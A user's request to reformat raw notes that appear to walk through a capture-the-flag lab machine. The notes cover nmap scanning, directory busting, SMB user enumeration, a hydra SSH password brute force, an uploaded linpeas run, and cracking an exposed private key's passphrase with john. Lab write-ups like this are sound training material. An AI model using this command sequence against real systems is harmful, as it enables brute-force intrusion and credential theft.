In the same kind of format write well formatted notes for the following

Raw Notes:
Use Nmap to get all the running services on the machines
nmap -A 10.10.57.186 -T4

got HTTP, SSH and SMB service running

use ffuf to get dir busting
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.57.186/FUZZ

found /development dir where we find some notes and in that some of the passwrds are weak

we dont know usernames so we can try enum4linux
enum4linux 10.10.57.186 -e
we got two usernames jan and kay

lets brute force username and passwords using hydra
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.57.186
got something jan:armando

log in to the machine using the creds that we found
ssh jan@10.10.57.186
jan@10.10.57.186 password:armando

we can cd and stuff we find the directory of kay and it has pass.bak but permission is denied

we can use linpeas.sh to get the points that can be used for previlage escalation

as we know ssh password we can use scp
scp /home/kali/Downloads/linpeas.sh jan@10.10.57.186:/dev/shm

then in the machine shell
cd /dev/shm
chmod +x linpeas.sh
./linpeas.sh | tee linlog.txt

we saw that the private RSA key of kay is exposed and can be used to ssh as kay
stored it on our local machine
ssh -i kay_key.txt kay@10.10.57.186

but it is password protected so we must use johntherippers tool ssh2john this will first convert the rsa to format that john can understand
/bin/ssh2john kay_key.txt > for_john.txt

now use john with rockyou wordlist
john for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt

boom we got the paraphrase for rsa key
beeswax

now ssh with the rsa file
ssh -i kay_key.txt kay@10.10.57.186
Enter passphrase for key 'kay_key.txt':beeswax

bingo we got in as kay

now cat pass.bak we get the final password

BOOM room solved
